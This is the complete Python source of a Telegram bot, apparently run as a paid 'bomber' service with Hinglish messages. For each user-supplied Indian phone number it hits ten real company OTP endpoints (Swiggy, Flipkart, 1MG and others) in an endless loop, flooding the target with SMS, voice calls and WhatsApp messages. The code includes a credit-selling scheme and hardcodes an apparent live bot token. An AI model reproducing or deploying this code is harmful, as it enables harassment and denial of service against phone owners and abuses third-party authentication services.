#!/usr/bin/env python3

import asyncio
import aiohttp
from aiohttp import web
import random
import time
import json
import os
import string
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter
import logging

# Logging configuration
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- [ CONFIGURATION ] ---
BOT_TOKEN = "8927679179:AAHSovin2ewne_VUKY7FVEA4lEz6figrVZ0"
DEVELOPER_ID = "@theplayerror"
ADMIN_IDS = [5057489358]
DB_FILE = "users_db.json"
REDEEM_DB_FILE = "redeem_codes.json"

# --- [ FORCE JOIN CONFIGURATION ] ---
CHANNEL_ID = "@zerotracelegit"

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())

# --- [ FSM STATES ] ---
class AdminStates(StatesGroup):
    waiting_for_broadcast = State()
    waiting_for_add_credits = State()
    waiting_for_remove_credits = State()
    waiting_for_user_info = State()
    waiting_for_redeem_code = State()
    waiting_for_redeem_amount = State()
    waiting_for_redeem_limit = State()
    waiting_for_phone_number = State()

# Attack tracking variables
stop_signals = {}
user_attacks = {}
attack_stats = {}

# --- [ REDEEM DATABASE FUNCTIONS ] ---
def load_redeem_db():
    if not os.path.exists(REDEEM_DB_FILE):
        with open(REDEEM_DB_FILE, 'w') as f:
            json.dump({"codes": {}}, f, indent=4)
    try:
        with open(REDEEM_DB_FILE, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Redeem database read error: {e}")
        return {"codes": {}}

def save_redeem_db(data):
    try:
        with open(REDEEM_DB_FILE, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        logger.error(f"Redeem database save error: {e}")

def generate_redeem_code(length=6):
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def create_redeem_code(code, credits, max_uses):
    db = load_redeem_db()
    db["codes"][code] = {
        "credits": credits,
        "max_uses": max_uses,
        "used_count": 0,
        "redeemed_by": [],
        "created_at": time.strftime('%d-%m-%Y %H:%M:%S'),
        "created_by": "Admin"
    }
    save_redeem_db(db)

def validate_redeem_code(code, user_id):
    db = load_redeem_db()
    if code not in db["codes"]:
        return False, "Invalid code! Yeh code exist nahi karta."
    
    code_data = db["codes"][code]
    if code_data["used_count"] >= code_data["max_uses"]:
        return False, "Yeh code already use ho chuka hai (limit reached)."
    
    if str(user_id) in code_data["redeemed_by"]:
        return False, "Aap yeh code pehle hi use kar chuke ho."
    
    code_data["used_count"] += 1
    code_data["redeemed_by"].append(str(user_id))
    save_redeem_db(db)
    
    user_db = load_db()
    if str(user_id) in user_db["users"]:
        user_db["users"][str(user_id)]["credits"] += code_data["credits"]
        save_db(user_db)
    
    return True, f"✅ Code successfully redeem ho gaya! +{code_data['credits']} Credits mile."

# --- [ DATABASE FUNCTIONS ] ---
def load_db():
    if not os.path.exists(DB_FILE):
        with open(DB_FILE, 'w') as f:
            json.dump({"users": {}}, f, indent=4)
    try:
        with open(DB_FILE, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Database read error: {e}")
        return {"users": {}}

def save_db(data):
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        logger.error(f"Database save error: {e}")

def register_user(user_id, username):
    db = load_db()
    uid = str(user_id)
    is_admin = user_id in ADMIN_IDS
    
    if uid not in db["users"]:
        db["users"][uid] = {
            "username": f"@{username}" if username else "No Username",
            "credits": float('inf') if is_admin else 10,
            "total_attacks": 0,
            "joined_at": time.strftime('%d-%m-%Y %H:%M:%S'),
            "is_admin": is_admin
        }
        save_db(db)
    elif username:
        db["users"][uid]["username"] = f"@{username}"
        db["users"][uid]["is_admin"] = is_admin
        if is_admin:
            db["users"][uid]["credits"] = float('inf')
        save_db(db)

def get_user_data(user_id):
    db = load_db()
    return db["users"].get(str(user_id))

def is_admin(user_id):
    return user_id in ADMIN_IDS

# --- [ SUBSCRIPTION VERIFICATION ] ---
async def check_subscription(user_id: int) -> bool:
    if is_admin(user_id):
        return True
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        valid_statuses = ["creator", "administrator", "member"]
        return member.status in valid_statuses
    except Exception as e:
        logger.error(f"Subscription check failed: {e}")
        return False

# --- [ DUMMY SERVER ] ---
async def handle_ping(request):
    return web.Response(text="Bot is alive and running!", content_type="text/plain")

async def start_dummy_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/ping', handle_ping)
    
    runner = web.AppRunner(app)
    await runner.setup()
    
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logger.info(f"Dummy Web Server started on port: {port}")

# --- [ ANIMATION FRAMES ] ---
ANIMATION_FRAMES = [
    "🔄 APIs Load ho rahi hain...",
    "⚡ Server connect ho raha hai...", 
    "🔥 Target par firing start...",
    "💥 Bombarding shuru ho gayi...",
    "🚀 Request bheji ja rahi hain...",
    "🎯 Target locked!"
]

# --- [ ULTIMATE API COLLECTION ] ---
ULTIMATE_APIS = [
    {
        "name": "Tata Capital Voice Call",
        "type": "Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "1MG Voice Call", 
        "type": "Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}'
    },
    {
        "name": "Swiggy Call Verification",
        "type": "Call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Flipkart Voice Call",
        "type": "Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "Lenskart SMS",
        "type": "SMS",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "name": "PharmEasy SMS",
        "type": "SMS",
        "url": "https://pharmeasy.in/api/v2/auth/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"phone":"{phone}"}}'
    },
    {
        "name": "Snitch SMS",
        "type": "SMS",
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "name": "ShipRocket SMS",
        "type": "SMS",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
    },
    {
        "name": "KPN WhatsApp",
        "type": "WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST", 
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "name": "Rappi WhatsApp",
        "type": "WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
    }
]

async def hit_api(session, api, phone, stats):
    try:
        url = api["url"]
        data = api["data"](phone) if api["data"] else None
        
        if callable(url):
            url = url(phone)
        
        async with session.request(
            method=api["method"],
            url=url,
            headers=api["headers"],
            data=data,
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False
        ) as response:
            if response.status in [200, 201, 202, 204]:
                api_type = api.get("type", "SMS")
                stats[api_type] = stats.get(api_type, 0) + 1
                return True
    except Exception:
        pass
    return False

async def animate_message(chat_id, message_id, text_prefix="", frames=None):
    if frames is None:
        frames = ANIMATION_FRAMES
    
    for frame in frames:
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=f"{frame}\n<code>{text_prefix}</code>"
            )
            await asyncio.sleep(0.4)
        except Exception:
            break

# --- [ KEYBOARDS ] ---
def create_main_keyboard(user_id):
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🚀 Start Infinite Boom"))
    builder.row(types.KeyboardButton(text="👤 Meri Profile"), types.KeyboardButton(text="📊 Check Stats"))
    
    if not is_admin(user_id):
        builder.row(types.KeyboardButton(text="💰 Buy Credits"), types.KeyboardButton(text="🎟️ Redeem Code"))
    
    builder.row(types.KeyboardButton(text="ℹ️ Help Guide"))
    
    if is_admin(user_id):
        builder.row(types.KeyboardButton(text="👑 Admin Panel"))
        
    return builder.as_markup(resize_keyboard=True)

def create_stop_keyboard():
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛑 STOP ATTACK"))
    builder.row(types.KeyboardButton(text="📊 Live Attack Stats"))
    builder.row(types.KeyboardButton(text="🏠 Main Menu"))
    return builder.as_markup(resize_keyboard=True)

def create_admin_inline_keyboard():
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="👥 Total Users", callback_data="adm_users"),
        InlineKeyboardButton(text="📢 Broadcast Msg", callback_data="adm_broadcast")
    )
    builder.row(
        InlineKeyboardButton(text="➕ Add Credits", callback_data="adm_give_credits"),
        InlineKeyboardButton(text="➖ Remove Credits", callback_data="adm_remove_credits")
    )
    builder.row(
        InlineKeyboardButton(text="🔍 User Info Check", callback_data="adm_user_info")
    )
    builder.row(
        InlineKeyboardButton(text="🎟️ Create Redeem Code", callback_data="adm_create_redeem"),
        InlineKeyboardButton(text="📋 List Redeem Codes", callback_data="adm_list_redeem")
    )
    return builder.as_markup()

def create_force_join_keyboard():
    builder = InlineKeyboardBuilder()
    c_link = f"https://t.me/{CHANNEL_ID.replace('@', '')}"
    
    builder.row(InlineKeyboardButton(text="📢 Join Channel", url=c_link))
    builder.row(InlineKeyboardButton(text="✅ Verify / Joined", callback_data="verify_sub"))
    return builder.as_markup()

# --- [ FORCE JOIN HELPER MESSAGE ] ---
async def send_join_request_message(message: types.Message):
    join_text = f"""
🔒 <b>ACCESS LOCKED!</b> 🔒

Bot ke advance features use karne ke liye aapko humare official channel ko join karna zaroori hai.

🔥 <b>BOT KEY FEATURES:</b>
⚡ <b>3-in-1 Attack:</b> SMS + Voice Call + WhatsApp ek sath.
📊 <b>Live Auto-Stats:</b> Screen automatic update hogi (Live hits & timer).
🎁 <b>Free Trial:</b> Har naye user ko 10 Free Credits.
🎟️ <b>Redeem System:</b> Special codes se credits paayein.
🛑 <b>Instant Stop:</b> 1-click me attack turant band karne ka control.

👇 Neeche channel join karke <b>'✅ Verify / Joined'</b> par click karein:
    """
    await message.answer(join_text, reply_markup=create_force_join_keyboard(), parse_mode="HTML")

# --- [ USER MESSAGE HANDLERS ] ---

@dp.message(CommandStart())
async def start_command(message: types.Message):
    register_user(message.from_user.id, message.from_user.username)
    
    if not await check_subscription(message.from_user.id):
        await send_join_request_message(message)
        return
        
    u_data = get_user_data(message.from_user.id)
    
    if is_admin(message.from_user.id):
        welcome_text = f"""
👑 <b>ADMIN ACCESS GRANTED!</b> 👑

⚡ <b>Status:</b> Unlimited Access (No Credit System)
🚀 <b>Attack:</b> Kabhi bhi, kitni bhi baar!

📌 <b>Admin Features:</b>
• Unlimited Attacks
• User Management
• Broadcast Messages
• Redeem Code Generation
• Credit Management

👨‍💻 <b>Developer:</b> {DEVELOPER_ID}
        """
    else:
        welcome_text = f"""
🎯 <b>BOMBER BOT ME AAPKA SWAGAT HAI!</b> 🎯

👤 <b>Balance:</b> <code>{u_data['credits']} Credits</code>
⚡ <b>Attack Cost:</b> 5 Credits per Attack
🎟️ <b>Redeem:</b> /redeem CODE

👨‍💻 <b>Support:</b> {DEVELOPER_ID}
        """
    
    await message.answer(welcome_text, reply_markup=create_main_keyboard(message.from_user.id))

# --- [ REDEEM COMMAND ] ---
@dp.message(Command("redeem"))
async def redeem_command(message: types.Message):
    user_id = message.from_user.id
    
    if not await check_subscription(user_id):
        await send_join_request_message(message)
        return
    
    if is_admin(user_id):
        await message.answer("👑 Admin ke liye redeem code ki zaroorat nahi hai!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer(
                "❌ <b>Usage:</b> <code>/redeem CODE</code>\n"
                "Example: <code>/redeem ABC123</code>",
                parse_mode="HTML"
            )
            return
        
        code = parts[1].upper()
        register_user(user_id, message.from_user.username)
        success, response = validate_redeem_code(code, user_id)
        
        if success:
            u_data = get_user_data(user_id)
            await message.answer(
                f"🎉 {response}\n\n"
                f"💰 <b>New Balance:</b> <code>{u_data['credits']} Credits</code>",
                parse_mode="HTML"
            )
        else:
            await message.answer(f"❌ {response}", parse_mode="HTML")
            
    except Exception as e:
        logger.error(f"Redeem error: {e}")
        await message.answer("❌ Error! Dubara try karein.")

@dp.callback_query(F.data == "verify_sub")
async def verify_subscription_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    if await check_subscription(user_id):
        register_user(user_id, callback.from_user.username)
        await callback.answer("✅ Verified!", show_alert=True)
        try:
            await callback.message.delete()
        except Exception:
            pass
        
        await callback.message.answer(
            "✅ <b>Bot Unlocked!</b>",
            reply_markup=create_main_keyboard(user_id)
        )
    else:
        await callback.answer("❌ Channel join nahi kiya!", show_alert=True)

@dp.message(F.text == "👤 Meri Profile")
async def user_profile(message: types.Message):
    if not await check_subscription(message.from_user.id):
        await send_join_request_message(message)
        return
        
    register_user(message.from_user.id, message.from_user.username)
    u_data = get_user_data(message.from_user.id)
    
    if is_admin(message.from_user.id):
        profile_text = f"""
👑 <b>ADMIN PROFILE</b>

🆔 <b>ID:</b> <code>{message.from_user.id}</code>
👤 <b>Username:</b> {u_data['username']}
⚡ <b>Status:</b> Unlimited Access
🚀 <b>Total Attacks:</b> {u_data['total_attacks']}
        """
    else:
        profile_text = f"""
👤 <b>PROFILE</b>

🆔 <b>ID:</b> <code>{message.from_user.id}</code>
👤 <b>Username:</b> {u_data['username']}
💰 <b>Credits:</b> <code>{u_data['credits']}</code>
🚀 <b>Total Attacks:</b> {u_data['total_attacks']}
        """
    
    await message.answer(profile_text, parse_mode="HTML")

@dp.message(F.text == "💰 Buy Credits")
async def buy_credits_info(message: types.Message):
    if is_admin(message.from_user.id):
        await message.answer("👑 Admin ko credits ki zaroorat nahi!")
        return
        
    await message.answer(
        f"💎 <b>RECHARGE PLANS</b>\n\n"
        f"₹30 = 50 Credits\n"
        f"₹50 = 90 Credits\n"
        f"₹70 = 130 Credits\n\n"
        f"📥 Contact: {DEVELOPER_ID}"
    )

@dp.message(F.text == "🎟️ Redeem Code")
async def redeem_code_prompt(message: types.Message):
    if is_admin(message.from_user.id):
        await message.answer("👑 Admin ko redeem ki zaroorat nahi!")
        return
        
    await message.answer(
        "🎟️ <b>REDEEM</b>\n\n"
        "Use: <code>/redeem CODE</code>\n"
        "Or direct code type karein"
    )

@dp.message(F.text == "ℹ️ Help Guide")
async def help_command(message: types.Message):
    help_text = f"""
🆘 <b>HELP</b>

1. '🚀 Start Infinite Boom' click karein
2. 10-digit number bhejein
3. Attack start ho jayega

🎟️ Redeem: <code>/redeem CODE</code>

📞 Contact: {DEVELOPER_ID}
    """
    await message.answer(help_text)

# --- [ ADMIN PANEL ] ---

@dp.message(F.text == "👑 Admin Panel")
async def admin_panel(message: types.Message):
    if not is_admin(message.from_user.id):
        return
    
    await message.answer(
        "🛠️ <b>ADMIN PANEL</b>",
        reply_markup=create_admin_inline_keyboard()
    )

@dp.callback_query(F.data == "adm_users")
async def admin_total_users(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    db = load_db()
    total = len(db["users"])
    await callback.message.edit_text(
        f"📊 <b>Total Users:</b> {total}",
        reply_markup=create_admin_inline_keyboard()
    )
    await callback.answer()

@dp.callback_query(F.data == "adm_broadcast")
async def admin_broadcast_prompt(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_for_broadcast)
    await callback.message.answer("📢 Broadcast message bhejein:")
    await callback.answer()

@dp.message(AdminStates.waiting_for_broadcast)
async def process_broadcast(message: types.Message, state: FSMContext):
    await state.clear()
    if not is_admin(message.from_user.id):
        return
    
    db = load_db()
    success = 0
    failed = 0
    
    for uid in db["users"]:
        try:
            await bot.send_message(chat_id=int(uid), text=message.text)
            success += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed += 1
    
    await message.answer(f"📢 <b>Broadcast:</b> ✅ {success} | ❌ {failed}")

@dp.callback_query(F.data == "adm_give_credits")
async def admin_add_credits_prompt(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_for_add_credits)
    await callback.message.answer("➕ Format: <code>USER_ID AMOUNT</code>")
    await callback.answer()

@dp.message(AdminStates.waiting_for_add_credits)
async def process_add_credits(message: types.Message, state: FSMContext):
    await state.clear()
    if not is_admin(message.from_user.id):
        return
    
    try:
        user_id, amount = message.text.split()
        amount = int(amount)
        
        db = load_db()
        if user_id in db["users"] and not db["users"][user_id].get('is_admin', False):
            db["users"][user_id]["credits"] += amount
            save_db(db)
            await message.answer(f"✅ {amount} Credits added to {user_id}")
        else:
            await message.answer("❌ User nahi mila ya admin hai!")
    except Exception:
        await message.answer("❌ Invalid format!")

@dp.callback_query(F.data == "adm_remove_credits")
async def admin_remove_credits_prompt(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_for_remove_credits)
    await callback.message.answer("➖ Format: <code>USER_ID AMOUNT</code>")
    await callback.answer()

@dp.message(AdminStates.waiting_for_remove_credits)
async def process_remove_credits(message: types.Message, state: FSMContext):
    await state.clear()
    if not is_admin(message.from_user.id):
        return
    
    try:
        user_id, amount = message.text.split()
        amount = int(amount)
        
        db = load_db()
        if user_id in db["users"] and not db["users"][user_id].get('is_admin', False):
            db["users"][user_id]["credits"] = max(0, db["users"][user_id]["credits"] - amount)
            save_db(db)
            await message.answer(f"✅ {amount} Credits removed from {user_id}")
        else:
            await message.answer("❌ User nahi mila ya admin hai!")
    except Exception:
        await message.answer("❌ Invalid format!")

@dp.callback_query(F.data == "adm_user_info")
async def admin_user_info_prompt(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        return
    await state.set_state(AdminStates.waiting_for_user_info)
    await callback.message.answer("🔍 User ID bhejein:")
    await callback.answer()

@dp.message(AdminStates.waiting_for_user_info)
async def process_user_info(message: types.Message, state: FSMContext):
    await state.clear()
    if not is_admin(message.from_user.id):
        return
    
    uid = message.text.strip()
    db = load_db()
    if uid in db["users"]:
        u = db["users"][uid]
        credits = "∞" if u.get('is_admin', False) else u['credits']
        await message.answer(f"👤 <b>User:</b> {u['username']}\n💰 <b>Credits:</b> {credits}")
    else:
        await message.answer("❌ User nahi mila!")

# --- [ REDEEM CODE CREATION - FIXED FSM ] ---

@dp.callback_query(F.data == "adm_create_redeem")
async def admin_create_redeem_prompt(callback: types.CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("❌ Admin only!", show_alert=True)
        return
    
    # IMPORTANT: Set state properly
    await state.set_state(AdminStates.waiting_for_redeem_code)
    
    await callback.message.answer(
        "🎟️ <b>CREATE REDEEM CODE</b>\n\n"
        "<b>Step 1:</b> Code enter karein (4-10 alphanumeric):\n"
        "<i>Ya RANDOM type karein auto-generate ke liye</i>",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(AdminStates.waiting_for_redeem_code)
async def process_redeem_code_input(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    
    code_input = message.text.strip().upper()
    
    if code_input == "RANDOM":
        code = generate_redeem_code(6)
    else:
        if not code_input.isalnum() or len(code_input) < 4 or len(code_input) > 10:
            await message.answer("❌ Invalid code! 4-10 alphanumeric use karein.")
            return
        code = code_input
    
    await state.update_data(redeem_code=code)
    await state.set_state(AdminStates.waiting_for_redeem_amount)
    
    await message.answer(
        f"✅ Code: <b>{code}</b>\n\n"
        f"<b>Step 2:</b> Credits amount enter karein:",
        parse_mode="HTML"
    )

@dp.message(AdminStates.waiting_for_redeem_amount)
async def process_redeem_amount(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    
    try:
        amount = int(message.text.strip())
        if amount <= 0:
            await message.answer("❌ Amount positive hona chahiye!")
            return
        
        await state.update_data(redeem_amount=amount)
        await state.set_state(AdminStates.waiting_for_redeem_limit)
        
        await message.answer(
            f"✅ Amount: <b>{amount} Credits</b>\n\n"
            f"<b>Step 3:</b> User limit enter karein:",
            parse_mode="HTML"
        )
    except ValueError:
        await message.answer("❌ Number enter karein!")

@dp.message(AdminStates.waiting_for_redeem_limit)
async def process_redeem_limit(message: types.Message, state: FSMContext):
    if not is_admin(message.from_user.id):
        return
    
    try:
        max_uses = int(message.text.strip())
        if max_uses <= 0:
            await message.answer("❌ Limit positive honi chahiye!")
            return
        
        data = await state.get_data()
        code = data.get('redeem_code')
        amount = data.get('redeem_amount')
        
        create_redeem_code(code, amount, max_uses)
        
        # IMPORTANT: Clear state
        await state.clear()
        
        await message.answer(
            f"🎉 <b>CODE CREATED!</b>\n\n"
            f"🎟️ Code: <code>{code}</code>\n"
            f"💰 Credits: {amount}\n"
            f"👥 Limit: {max_uses}\n\n"
            f"Use: <code>/redeem {code}</code>",
            reply_markup=create_main_keyboard(message.from_user.id)
        )
    except ValueError:
        await message.answer("❌ Number enter karein!")
    except Exception as e:
        logger.error(f"Redeem limit error: {e}")
        await state.clear()
        await message.answer(f"❌ Error: {e}")

@dp.callback_query(F.data == "adm_list_redeem")
async def admin_list_redeem_codes(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id):
        return
    
    db = load_redeem_db()
    codes = db.get("codes", {})
    
    if not codes:
        await callback.message.edit_text(
            "📋 <b>Codes:</b> None",
            reply_markup=create_admin_inline_keyboard()
        )
    else:
        text = "🎟️ <b>ALL CODES:</b>\n\n"
        for code, data in codes.items():
            text += f"• <code>{code}</code> | 💰{data['credits']} | 👥{data['used_count']}/{data['max_uses']}\n"
        
        await callback.message.edit_text(text, reply_markup=create_admin_inline_keyboard())
    await callback.answer()

# --- [ ATTACK LOGIC ] ---

@dp.message(F.text == "🚀 Start Infinite Boom")
async def start_attack_prompt(message: types.Message, state: FSMContext):
    if not await check_subscription(message.from_user.id):
        await send_join_request_message(message)
        return
        
    register_user(message.from_user.id, message.from_user.username)
    u_data = get_user_data(message.from_user.id)
    
    if not is_admin(message.from_user.id) and u_data["credits"] < 5:
        await message.answer("❌ <b>Low Credits!</b> Minimum 5 chahiye.")
        return
    
    await state.set_state(AdminStates.waiting_for_phone_number)
    await message.answer("📱 <b>10-digit number bhejein:</b>")

@dp.message(AdminStates.waiting_for_phone_number)
async def handle_phone_number(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    phone = message.text.strip()
    
    await state.clear()
    
    if not phone.isdigit() or len(phone) != 10:
        await message.answer("❌ 10-digit number bhejein!")
        return
        
    register_user(user_id, message.from_user.username)
    db = load_db()
    u_data = db["users"].get(str(user_id))
    
    if not is_admin(user_id) and u_data["credits"] < 5:
        await message.answer("❌ Low credits!")
        return
    
    if not phone.startswith(('6', '7', '8', '9')):
        await message.answer("❌ Indian number 6/7/8/9 se shuru hona chahiye!")
        return
    
    if not is_admin(user_id):
        db["users"][str(user_id)]["credits"] -= 5
        credits_left = db["users"][str(user_id)]["credits"]
    else:
        credits_left = "∞"
    
    db["users"][str(user_id)]["total_attacks"] += 1
    save_db(db)
    
    stop_signals[user_id] = False
    user_attacks[user_id] = {
        'phone': phone,
        'start_time': time.time(),
        'delay': 5,
        'cycles': 0
    }
    attack_stats[user_id] = {
        'Call': 0,
        'SMS': 0,
        'WhatsApp': 0,
        'cycles': 0
    }
    
    start_msg = await message.answer(
        f"🎯 <b>ATTACK STARTING...</b>\n\n"
        f"📱 Target: <code>{phone}</code>\n"
        f"⚡ Credits Left: {credits_left}",
        parse_mode="HTML",
        reply_markup=create_stop_keyboard()
    )
    
    await animate_message(message.chat.id, start_msg.message_id, f"Target: {phone}")
    asyncio.create_task(run_attack(user_id, phone, message.chat.id, start_msg.message_id))

async def run_attack(user_id, phone, chat_id, message_id):
    stats = attack_stats[user_id]
    attack_info = user_attacks[user_id]
    delay = attack_info['delay']
    
    async with aiohttp.ClientSession() as session:
        cycle_count = 0
        
        while not stop_signals.get(user_id, False):
            try:
                cycle_count += 1
                stats['cycles'] = cycle_count
                
                tasks = [hit_api(session, api, phone, stats) for api in ULTIMATE_APIS]
                await asyncio.gather(*tasks, return_exceptions=True)
                
                calls = stats.get('Call', 0)
                sms = stats.get('SMS', 0)
                wa = stats.get('WhatsApp', 0)
                total = calls + sms + wa
                
                status_text = f"""
🎯 <b>CYCLE {cycle_count}</b>

📞 Calls: {calls}
📩 SMS: {sms}
💬 WA: {wa}
🔥 Total: {total}
                """
                
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=status_text,
                        parse_mode="HTML",
                        reply_markup=create_stop_keyboard()
                    )
                except Exception:
                    pass
                
                if stop_signals.get(user_id, False):
                    break
                    
                await asyncio.sleep(delay)
                
            except Exception as e:
                await asyncio.sleep(5)
    
    final_text = f"""
🛑 <b>STOPPED</b>

🔥 Total Hits: {calls + sms + wa}
    """
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=final_text,
            parse_mode="HTML",
            reply_markup=create_main_keyboard(user_id)
        )
    except Exception:
        pass
    
    if user_id in stop_signals: del stop_signals[user_id]
    if user_id in user_attacks: del user_attacks[user_id]

# --- [ NAVIGATION ] ---

@dp.message(F.text == "🛑 STOP ATTACK")
async def stop_attack(message: types.Message):
    user_id = message.from_user.id
    if user_id in stop_signals:
        stop_signals[user_id] = True
        await message.answer("🛑 Stopping...", reply_markup=create_main_keyboard(user_id))
    else:
        await message.answer("ℹ️ No active attack.", reply_markup=create_main_keyboard(user_id))

@dp.message(F.text == "📊 Live Attack Stats")
async def live_stats(message: types.Message):
    user_id = message.from_user.id
    if user_id in attack_stats and user_id in user_attacks:
        stats = attack_stats[user_id]
        await message.answer(
            f"📊 <b>LIVE STATS</b>\n\n"
            f"📞 Calls: {stats.get('Call', 0)}\n"
            f"📩 SMS: {stats.get('SMS', 0)}\n"
            f"💬 WA: {stats.get('WhatsApp', 0)}\n"
            f"🔥 Total: {stats.get('Call', 0) + stats.get('SMS', 0) + stats.get('WhatsApp', 0)}"
        )
    else:
        await message.answer("ℹ️ No attack data.")

@dp.message(F.text == "📊 Check Stats")
async def check_stats(message: types.Message):
    user_id = message.from_user.id
    register_user(user_id, message.from_user.username)
    u_data = get_user_data(user_id)
    
    if is_admin(user_id):
        await message.answer(f"👑 Total Attacks: {u_data['total_attacks']}")
    else:
        await message.answer(f"📊 Attacks: {u_data['total_attacks']}\n💰 Credits: {u_data['credits']}")

@dp.message(F.text == "🏠 Main Menu")
async def main_menu(message: types.Message):
    await message.answer("🏠 <b>Main Menu</b>", reply_markup=create_main_keyboard(message.from_user.id))

# --- [ DIRECT REDEEM INPUT - LAST HANDLER ] ---
@dp.message()
async def handle_all_messages(message: types.Message):
    user_id = message.from_user.id
    text = message.text.strip().upper()
    
    # Check if it's a redeem code (4-10 alphanumeric)
    if text.isalnum() and 4 <= len(text) <= 10:
        if not await check_subscription(user_id):
            await send_join_request_message(message)
            return
        
        if is_admin(user_id):
            await message.answer("👑 Admin ko redeem ki zaroorat nahi!")
            return
        
        register_user(user_id, message.from_user.username)
        success, response = validate_redeem_code(text, user_id)
        
        if success:
            u_data = get_user_data(user_id)
            await message.answer(f"✅ {response}\n💰 Balance: {u_data['credits']}")
        else:
            await message.answer(f"❌ {response}")
    else:
        await message.answer(
            "❓ <b>Invalid Input!</b>\n\n"
            "Buttons use karein ya 10-digit number bhejein.",
            reply_markup=create_main_keyboard(user_id)
        )

# --- [ BOT BOOTSTRAP ] ---
async def main():
    logger.info("Bot starting...")
    logger.info(f"APIs: {len(ULTIMATE_APIS)}")
    logger.info(f"Channel: {CHANNEL_ID}")
    logger.info(f"Admins: {ADMIN_IDS}")
    
    try:
        await start_dummy_server()
    except Exception as e:
        logger.error(f"Server error: {e}")
        
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logger.error(f"Bot crash: {e}")
        await asyncio.sleep(5)
        await main()

if __name__ == "__main__":
    asyncio.run(main())
